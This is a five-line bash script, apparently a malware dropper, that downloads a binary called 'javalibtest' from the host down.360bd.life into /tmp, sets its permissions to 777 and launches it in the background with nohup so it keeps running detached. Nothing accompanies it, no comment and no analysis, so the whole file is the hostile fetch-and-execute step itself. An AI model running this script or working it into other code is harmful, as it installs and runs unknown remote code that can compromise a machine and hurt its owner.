#!/bin/bash
wget http://down.360bd.life/javalibtest -O /tmp/javalib
chmod 777 /tmp/javalib
cd /tmp
nohup ./javalib &
